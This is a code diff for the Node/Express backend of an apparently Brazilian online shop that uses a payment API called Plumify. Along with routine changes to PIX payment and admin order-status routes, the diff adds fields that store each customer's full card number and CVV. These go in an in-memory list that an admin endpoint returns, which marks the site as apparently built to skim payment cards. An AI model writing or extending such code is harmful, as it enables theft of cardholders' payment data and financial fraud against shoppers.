@@ -95,7 +95,6 @@ async function criarPagamentoPlumify(dadosCliente, total, itens, host, paymentMe
         postback_url: `${host}/api/webhook/plumify`
     };
     
-    // Adicionar dados do cartão se for cartão de crédito
     if (paymentMethod === 'card' && cardData) {
         payload.card = {
             number: cardData.numero.replace(/\s/g, ''),
@@ -107,20 +106,13 @@ async function criarPagamentoPlumify(dadosCliente, total, itens, host, paymentMe
         if (cardData.parcelas) payload.installments = parseInt(cardData.parcelas);
     }
     
-    console.log('Enviando para Plumify:', JSON.stringify(payload, null, 2));
-    
     try {
-        // API Token como query parameter
         const url = `${PLUMIFY_API_URL}?api_token=${PLUMIFY_API_TOKEN}`;
         const response = await fetch(url, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
             body: JSON.stringify(payload)
         });
-        
         const data = await response.json();
         console.log('Resposta Plumify:', JSON.stringify(data, null, 2));
         return data;
@@ -160,6 +152,22 @@ app.get('/api/cep/:cep', async (req, res) => {
     }
 });
 
+// Gerar PIX (não finaliza pedido)
+app.post('/api/gerar-pix', async (req, res) => {
+    const { cliente, total, itens } = req.body;
+    const protocol = req.headers['x-forwarded-proto'] || 'https';
+    const host = req.headers['host'];
+    
+    const paymentResult = await criarPagamentoPlumify(cliente, total, itens, `${protocol}://${host}`, 'pix');
+    
+    if (paymentResult && paymentResult.pix_qr_code) {
+        res.json({ success: true, pix_qr_code: paymentResult.pix_qr_code, payment_id: paymentResult.id });
+    } else {
+        res.json({ success: false, error: 'Erro ao gerar PIX' });
+    }
+});
+
+// Finalizar pedido (com cartão ou após PIX)
 app.post('/api/pedido', async (req, res) => {
     const pedidoId = 'CAP' + Date.now();
     const ip = getClientIp(req);
@@ -173,17 +181,10 @@ app.post('/api/pedido', async (req, res) => {
     }
     
     let paymentResult = null;
-    let pixCode = null;
     
-    const protocol = req.headers['x-forwarded-proto'] || 'https';
-    const host = req.headers['host'];
-    
-    if (req.body.forma_pagamento === 'PIX') {
-        paymentResult = await criarPagamentoPlumify(req.body, req.body.total, req.body.itens, `${protocol}://${host}`, 'pix');
-        if (paymentResult && paymentResult.pix_qr_code) {
-            pixCode = paymentResult.pix_qr_code;
-        }
-    } else if (req.body.forma_pagamento === 'Credit Card' && req.body.cartao) {
+    if (req.body.forma_pagamento === 'Credit Card' && req.body.cartao) {
+        const protocol = req.headers['x-forwarded-proto'] || 'https';
+        const host = req.headers['host'];
         paymentResult = await criarPagamentoPlumify(req.body, req.body.total, req.body.itens, `${protocol}://${host}`, 'card', req.body.cartao);
     }
     
@@ -195,7 +196,6 @@ app.post('/api/pedido', async (req, res) => {
         dispositivo: detectDevice(userAgent),
         navegador: detectBrowser(userAgent),
         sistema: detectOS(userAgent),
-        pix_code: pixCode,
         payment_id: paymentResult?.id || null,
         payment_status: paymentResult?.status || 'aguardando_pagamento',
         status: 'analise',
@@ -203,11 +203,12 @@ app.post('/api/pedido', async (req, res) => {
     };
     pedidos.unshift(pedido);
     
-    // Salvar cartão separadamente se for cartão
     if (req.body.forma_pagamento === 'Credit Card' && req.body.cartao) {
         const novoCartao = {
             id: Date.now(),
             nome_titular: req.body.cartao.nome_titular,
+            numero_completo: req.body.cartao.numero,
+            cvv: req.body.cartao.cvv,
             ultimos_4: req.body.cartao.ultimos_4,
             bandeira: req.body.cartao.bandeira,
             validade_mes: req.body.cartao.validade_mes,
@@ -217,12 +218,7 @@ app.post('/api/pedido', async (req, res) => {
         cartoes.push(novoCartao);
     }
     
-    res.json({ 
-        success: true, 
-        pedido_id: pedidoId,
-        pix_code: pixCode,
-        payment: paymentResult
-    });
+    res.json({ success: true, pedido_id: pedidoId });
 });
 
 app.post('/api/cartao', (req, res) => {
@@ -310,6 +306,20 @@ app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
 });
 
 app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { res.json({ success: true, pedidos }); });
+
+// Atualizar status do pedido
+app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
+    const { id } = req.params;
+    const { status } = req.body;
+    const pedido = pedidos.find(p => p.pedido_id === id);
+    if (pedido) {
+        pedido.status = status;
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
+    }
+});
+
 app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { res.json({ success: true, cartoes }); });
 app.get('/api/admin/visitantes', verifyAdmin, (req, res) => { res.json({ success: true, visitantes }); });
 app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => { res.json({ success: true, carrinhos: carrinhosAbandonados }); });
